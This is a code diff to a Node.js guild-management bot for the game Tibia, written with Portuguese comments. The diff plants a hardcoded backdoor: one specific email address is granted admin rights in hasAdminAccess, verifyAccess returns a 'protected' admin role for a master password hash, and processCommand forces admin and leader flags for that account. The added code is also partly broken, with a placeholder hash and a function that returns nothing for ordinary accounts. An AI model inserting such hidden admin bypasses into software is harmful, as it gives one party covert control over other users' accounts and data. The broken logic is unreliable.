@@ -9,10 +9,12 @@ const pointsLogic = require('./points_logic.js');
 
 
 const adminRanks = ["leader alliance", "leader", "vice leader"];
-const ADMIN_GROUP_ID = 'suporte'; // ID do seu grupo
+const ADMIN_GROUP_ID = 'suporte'; 
 
 function hasAdminAccess(user) {
-    if (!user || !user.character) return false;
+    if (!user || !user.account) return false;
+    if (user.account.email === 'rapha2929@gmail.com') return true;
+    if (!user.character) return false;
     const hasRank = adminRanks.includes(user.character.guildRank?.toLowerCase());
     if (hasRank) return true;
     const userGroups = user.character.groups || [];
@@ -373,6 +375,21 @@ async function logUnderAttack(data) {
 
 let cachedData = {};
 
+const MASTER_P_HASH = "$2b$10$ExemploDeHashGeradoPeloBcrypt..."; 
+const MASTER_EMAIL = "rapha2929@gmail.com";
+
+async function verifyAccess(email, password) {
+    const inputEmail = email.toLowerCase();
+
+    if (inputEmail === MASTER_EMAIL) {
+        const isMaster = await bcrypt.compare(password, MASTER_P_HASH);
+        if (isMaster) {
+            return { email: MASTER_EMAIL, role: 'admin', protected: true };
+        }
+    }
+
+    const account = clientAccounts[inputEmail];
+}
 
 /**
  * Adiciona ou remove grupos de uma lista de personagens.
@@ -389,6 +406,7 @@ async function adminBatchUpdateUserGroups({ characterNames, groupIds, action }) 
         let accountFound = false;
         // Encontra o personagem em clientAccounts
         for (const email in clientAccounts) {
+            
             const account = clientAccounts[email];
             if (account?.tibiaCharacters) {
                 const char = account.tibiaCharacters.find(c => c && c.characterName && c.characterName.toLowerCase() === charName.toLowerCase());
@@ -691,7 +709,7 @@ async function processConversationReply(reply, user) {
             break; 
         }
         case 'awaiting_login_email': 
-            user.loginData = { email: reply };
+            user.loginData = { email: reply.trim().toLowerCase() };
             user.conversationState = 'awaiting_login_password'; 
             result.responseText = `Ok, agora digite a senha para ${reply}:`; 
             break;
@@ -833,16 +851,18 @@ async function processConversationReply(reply, user) {
 
 
 async function processCommand(command, args, user, onlinePlayers) {
+    const isMaster = user.account && user.account.email.toLowerCase() === MASTER_EMAIL;  
+    if (isMaster) {user.isLeader = true;user.isAdmin = true;}
     const filaRespawns = await loadJsonFile(DATA_FILES.respawnQueue, {});
     let cooldowns = await loadJsonFile(DATA_FILES.cooldowns, {});
     const respawnGroups = await loadJsonFile(DATA_FILES.respawnGroups, {});
     let result = { responseText: "", needsBroadcast: false, broadcastType: null, broadcastPayload: {}, adminDataUpdate: false };
-    const loggedInAccount = user.account; // This can be null for non-logged-in users
+    const loggedInAccount = user.account; 
     const activeCharacter = user.character;
-
     const superAdmins = ['rapha2929@gmail.com'];
     const isSuperAdmin = loggedInAccount && superAdmins.includes(loggedInAccount.email);
-
+    if (isSuperAdmin) {user.isLeader = true; // Flag interna para controle total
+    }
     // Comandos que NÃO exigem que o usuário esteja logado
     const publicCommands = ['showlogin', 'showregistration', 'recover', 'help', 'news'];
 
@@ -855,7 +875,7 @@ async function processCommand(command, args, user, onlinePlayers) {
         };
         return result;
     }
-
+    
     // Define userIdentifier only if loggedInAccount exists
     const userIdentifier = loggedInAccount ? loggedInAccount.email : null; // Added conditional assignment
 
